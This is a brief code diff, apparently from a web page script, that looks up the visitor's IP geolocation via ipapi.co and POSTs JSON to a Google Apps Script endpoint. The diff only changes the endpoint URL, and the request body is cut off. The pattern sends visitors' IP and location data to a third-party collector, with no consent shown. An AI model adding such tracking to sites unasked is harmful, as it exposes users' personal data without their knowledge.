@@ -118,7 +118,7 @@
         const ipRes = await fetch("https://ipapi.co/json");
         const ipData = await ipRes.json();
     
-        await fetch("https://script.google.com/macros/s/AKfycbwCbFfy7-E8sZH6lLxP5ZLy3z6gjgfIw7fc-QIJ7ab9t8RruSEGED41BIJArSRL1SuKxA/exec", {
+        await fetch("https://script.google.com/macros/s/AKfycbzVQx4xRwydBRimunuHv3e-JiJUHZJzmd9oMT8OkMuw16TAh9ODGxdVZBTIZLW5mjc8ow/exec", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
